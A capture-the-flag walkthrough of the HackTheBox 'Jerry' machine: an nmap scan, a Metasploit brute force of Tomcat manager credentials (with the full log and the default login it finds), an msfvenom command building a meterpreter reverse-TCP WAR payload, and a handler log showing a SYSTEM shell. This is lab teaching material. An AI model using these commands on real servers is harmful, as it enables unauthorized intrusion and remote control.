---
layout: page
title: HackTheBox Jerry
---

Jerry is a challenge involving an apache server running Tomcat (thus the Tom and Jerry reference of the box). Exploiting the box requires basic enumeration scanning, some bruteforcing methods, knowledge of how apache tomcat servers work, and in this particular method that I used to solve: msfvenom and metasploit to create a metrepeter sessions. All of which is documented below.

### Enumeration
To first enumerate the box, I use ```nmap -sC -sV -oA scan 10.10.10.95```. This will scan for services and the output will be stored in ```scan.*``` in different formats for later use. The output is shown below:

![jerry](https://user-images.githubusercontent.com/41026969/54472176-97deaf80-479a-11e9-9cd5-7830d030d95a.PNG)

So from the photo above, it is shown that port 8080 is open for TCP connection and that it is running an Apache Tomcat server (that runs JSP code). So I do some more investigating by connection to the IP and port: ```10.10.10.95:8080```. It shows the page shown below:

![jerry](https://user-images.githubusercontent.com/41026969/54472198-1dfaf600-479b-11e9-8465-11ecbd70df6d.PNG)

So I see a pretty basic Apache Tomcat (looks like) default webpage. We can run a bruteforce scan to see if we can get into the application manager using metasploit. A cool thing about metasploit is that there is a built in search tool to find certain exploits and auxiliary functions. In this situation, I do ```search Tomcat``` to find anything related to Tomcat. This is what it finds:

![jerry](https://user-images.githubusercontent.com/41026969/54472258-e6d91480-479b-11e9-8d5a-ef1451ee0922.PNG)

We see there's an auxiliary function we can use: ```auxiliary/scanner/http/tomcat_mgr_login```, according to the description, it will find scan for possible login combinations that I can use for the Application Manager that was shown before. As seen below, I set ```BLANK_PASSWORDS``` to true (just incase) and set the remote host that I'll be scanning to ```10.10.10.95``` (doing ```show options``` shows the default port set to 8080 so we don't need to change that). This is the metasploit log:

```
msf > use auxiliary/scanner/http/tomcat_mgr_login 
msf auxiliary(scanner/http/tomcat_mgr_login) > set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.10.10.95
RHOSTS => 10.10.10.95
msf auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.10.95:8080 - LOGIN FAILED: admin: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[-] 10.10.10.95:8080 - LOGIN FAILED: both: (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/tomcat_mgr_login) >  
```

From the logs above I saw that I log into the application manager using credentials username ```tomcat``` and password ```s3cret```. This won't get us a shell, but we get a step closer. Exploring where we land using these credentials we get into this page of the application manager:

![jerry](https://user-images.githubusercontent.com/41026969/54472325-13d9f700-479d-11e9-87e4-6e63a5b66b8d.PNG)

This page reveals some more information. This machine is running a version of Windows 2012 64 bit (says under ```OS Architecture```) and that we can upload WAR files that can potential be used...

### Exploitation
Knowing that the server is running Windows and is 64 bit, we can craft a payload using ```msfvenom```. You can do ```msfvenom -h``` to list the commands/tacks used to specifically craft the payload (listed below too):

![jerry](https://user-images.githubusercontent.com/41026969/54472376-f48f9980-479d-11e9-9b65-cb474c576997.PNG)

msfvenom also has a search function that you can use to search through payload options. Knowing this is a windows 64 bit I know I can create a reverse TCP to spawn a meterpreter shell:

```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[my IP] LPORT=9001 -f war -o PleaseWork.war```

NOTE: there IS a difference between the paylods ```windows/x64/meterpreter_reverse_tcp``` and the one I'm using above. The one mentioned just now (not using) is bigger in size and creates a meterpreter session with full capabilities and functions. I simply use the smaller file as I just need a meterpreter shell and it's faster to upload for the server.

Also NOTE: WAR files are essentially zip files that the Tomcat server uses (think of it similar to an .apk file) to run code inside of it. Specifically we are going to be running one of the ```.jsp``` codes so first I unzip by doing ```unzip PleaseWork.war``` then doing an ```ls -la``` check I see there's a ```jkrpgtlkson.jsp``` file that the Tomcat server can run (it's going to be a different name for everyone). This is the file we'll be using to get the reverse TCP connection.

Going back to the website, under ```WAR file to deploy``` we can upload our newly crafted WAR file. When doing so and clicking the deploy button, it is shown in the website! We can then go to ```http://10.10.10.95:8080/PleaseWork/jkrpgtlkson.jsp``` to run the code.

![jerry](https://user-images.githubusercontent.com/41026969/54472458-10476f80-479f-11e9-8195-f1494af601da.PNG)

Since we don't have a listener set up it is showning a 404, we need to set up a metasploit session to start listening for a reverse TCP conneciton. We use mutli/handler and set the payload to the same thing we used in msfconsole: ```windows/x64/meterpreter/reverse_tcp```. Then we set the local host to ourselves and say we are listening on port 9001. Then I run the exploit. Here's the metasploit log of what I did:

```
msf > use exploit/multi/handler    
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => [my IP]
msf exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf exploit(multi/handler) > run -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on [my IP]:9001 
msf exploit(multi/handler) > [*] Sending stage (205891 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened ([my IP]:9001 -> 10.10.10.95:49193) at 2019-03-16 03:59:10 -0400

msf exploit(multi/handler) > show sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JERRY  [my IP]:9001 -> 10.10.10.95:49193 (10.10.10.95)

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : JERRY
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : en_US
Domain          : HTB
Logged On Users : 0
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We can then use the command ```shell``` to get a windows shell.

Flag location: ```C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt```

(you'll need to use double quotation marks ;)    )